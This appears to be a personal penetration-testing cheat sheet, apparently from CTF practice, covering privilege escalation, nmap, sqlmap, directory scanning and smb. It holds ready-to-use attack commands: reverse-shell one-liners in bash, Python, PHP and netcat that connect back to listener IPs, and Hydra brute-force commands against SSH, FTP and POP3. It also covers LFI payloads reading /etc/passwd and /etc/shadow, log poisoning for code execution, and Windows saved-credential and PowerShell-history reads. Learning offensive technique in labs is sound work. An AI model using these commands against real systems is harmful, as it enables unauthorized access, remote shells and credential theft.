# My CheatSheet
Through my 50 days challenge of pentest, I realized that I used to a lot of tools and command or I repeated these one a lot
so I thought why not create my own cheatsheet like that when I want to use them I'll just come here take the one that interested me.

=======[+] Privesc scanning [+]==============

- sudo binary check
```
sudo -l
```
- suid binary check
```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```
- capabilities check
```
/usr/bin/getcap -r  /usr/bin
getcap -r / 2>/dev/null
```
- ssh authorized_key/idRsa check
- crontab check
```
/etc/crontab
```
- wildcards
- kernel exploit check
```
uname -a
```
- sudoers access
```
/etc/sudoers
```
- file writeble
```
find / -writable 2>/dev/null
```
- Path hijacking

===web resource===
```
https://anonymousemail.me/
```

====Tools for priv escal=======
```
./linpeas
./linenum
./winpeas
```

=====Nmap cheatsheet======
```
nmap <ip> <options

preferred options: 

-sV : services versionning
-A : full info 
-T5 <ip> : 5x times faster
-Pn : bypass ping block or host discovery(windows)
-p- : all ports
-sC : includes some script nse
--script== : specified a nse script
-vv : full details
--open : only open ports
-n : exclude dns resolver
-oG : export as a greapable format
-sS : fast tcp scan 
--script
-min-rate : packet length, ex min-rate 5000

===best practice ===
nmap -n -p- -T5 --open <ip> (linux)
nmap -Pn -n -p- -T5 --open <ip> windows

====script nse====
http-enum
vuln
```

=====SQLmap cheatsheet=========
```
sqlmap -u <url>

preferred options:
-r <file.txt> 
-p username 
--forms 
--dump-all
--dbs
-D(--dbs) <db> -T(--tables) <table> -C(--columns) <columns>

```

=====[+] Reverse shell [+]=============
```
pentest monkey
revshells.com
```
=========[+] Search for exploit, suid, sudo [+]============
```
exploit-db.com
searchsploit
rapid7
gtfobins.github.io/
```
==========[+] web dir listing [+]=============

```
**BASIC AUTH GET**

nikto -h <ip>/url
dirsearch -u <url

gobuster dir --url <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40  -x <extension>,<extension>
-k : disable certificate
```

===[+]tty[+]==== </br>
`python3 -c 'import pty; pty.spawn("/bin/bash");'`

==[+]revShell[+]====

- BASH </br>
`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

- Python </br>
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.91.36",8889));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

- PHP </br>
`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

- Netcat </br>
`nc -e /bin/sh 10.0.0.1 1234`

- random </br>
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`


====[+] crack the hash [+]======= </br>
- https://crackstation.net
- https://gchq.github.io/CyberChef/
- https://dcode.fr


===vim cheatsheet===
```
press i to go into INSERT MODE,

!wq : save and exit
q

press ESC to quit INSERT MODE, press : 
and start writing
```

===special===
```
ssh2john
zip2john
tcpdump -i tun0 icmp
keepass2john
```

===important dirs linux===
```
/opt/backups/
/var/backups/
```

========grep cheatsheet====
```
grep <text> <options> ./fileDIr

preferred options:
-i : case insensitive
-v : exclude
-n : number of lines
```

===lfi bypass====
- check lfi
```
../../../../../../etc/passwd
```
-lfi to RCE
```
1. if you have an ftp upload a shell via put method
2. check the acess.log( log poisonning), or user-agent
```

- lfi bypass filter
```
php://filter/convert.base64-encode/resource=/etc/passwd
or
php://filter/resource=/etc/passwd
```

- files interesting
```
/etc/passwd
/etc/shadow
/etc/shells
/etc/group
/etc/hosts
```

- log files 
```
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/httpd/error_log
```

===Hydra cheatsheet===

```
hydra <options> <ip>

preferred options:

====best practice====
-- basic auth get
hydra -l username -P password_file.txt -s port -f ip_address request_method /path

-- pop3 bruteforce
hydra -l boris -P ~/myFiles/rockyou.txt -V 10.10.3.116 -s 55007 -t 2 pop3 -VVV -I -f

-- ftp bruteforce
hydra -l userlogin -P password-list-adress ftp://----IP--Address -VV

-- ssh bruteforce
hydra -l userlogin -P password-list-adress ssh ----IP--Address -VV
```

===ENV==
```
$PATH
$SHELL or /etc/shells
``` 

===top tools===
```
Remmina : rdp session
burpsuite : web dir, bruteforce, repeat request, encode
dirsearch, gobuster, dirbuster : web dir listing
nikto : web dir listing, scanning and enumaration
nmap : scanning and enumeration
enum4linux : look for shares, users, groups, password and connections
tshark : capture online traffic from the command-line 
whatweb : show info web
wireshark : read traffic
notebook : takes notes
notion enhancer : engamements notes
keepnote : take note proefficient
wafw00f : check webfirewall
nikto/dirb/gobuster : directory listing
osintFramework : wanna know where to go in a osint check this one
pspy64 : It allows you to see commands run by other users, cron jobs, etc. as they execute.
scp : use in ssh to copy files
xfreerdp/remmina : rdp session
```

===top  linux command===
```
whoami, chown, cut, awk, cd, su, sudo, id, ls, cat, chmod, exit, groupadd, useradd, chgrp, tail
usermod, chattr, mkdir, which, find, uname, gunzip, nano, ps, touch, diff, watch, file, echo, env,
pwd, strings, getcap, setcap, route, man, sort, seq, xargs, locate, wc, tcpdump, xxd, disown, gcc or cc,
sudo or doas, scp, nfs

-------------best-practices----------
tcpdump -i <interface>
2>/dev/null : redirect all errors
chattr +i file.txt : file can't be deleted
su <Username> : connect as this user
openssl passwd : generate a unix password
sudo -l : privilege
xxd -ps file.txt : raw format of an hex text or file
route -n : show interfaces
ps -eo command : show process running
watch -n 1 command : monitoring the command
bash -p : set the shell to high priv
export PATH=../../PathDirecYouWannaADD:$PATH
updatedb : update db for the locate command
wc -l file.txt : contains line number
sort -u : order by alphabethic
```

==server==
```
python3 -m http.server
```

=== smb ===
- smb enumeration
```
enum4linux -a <ip>

preferred:
-a : all, users, shares, workgroup, version os

```
- connect to smb share
```
smbclient //[ip]/shareName/

preferred:
-U [name] : to specify the user
-p [port] : to specify the port
```
=== scp ===
```
--copy file from local to remote---
scp document.txt user@<ip>:/pathUpload

--download file from remote to local--
scp <user>@<ip>:/path/file.txt ./
```

== nfs ===
```
sudo mount -t nfs IP:share /tmp/mount/ -nolock
```
==cut cheasheet==
```
cut -d ":" -f 1 file.txt
options:
-d : delimitor 
-f : champ
```

== list of file signature===
- gif
- jpg
- png


===file/dir permission==
```
d rwx rwx rwx 1 kal kal 0 Tue Oct 20 18:06:03 myDirectory

d => directory
- => file
r => read
w => write
x => execute:file or passThrough:directory 

d rwx  rwx   rwx      1                kal   kal      0      Tue Oct 20 18:06:03 myDirectory
  User Group Everyone Hard/SoftLink   User  Group   taille   Date      time      directoryName

```


===awk cheatsheet===
```
awk {print $1} -F=":" file.txt
options:
{print $1} : print the 1st argument
-FS : champ 
```


==windows priv===
- Powershell history
`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

- IIS config
`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

- Saved Windows Credentials
```
cmdkey /list
runas /savecred /user:admin cmd.exe
```
- Scheduled Tasks !!!
```
schtasks /query /tn <taskName> /fo list /v

Task To Run: path/taskName
```
To check the file permissions on the executable, we use *icacls*
```
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(F)
```








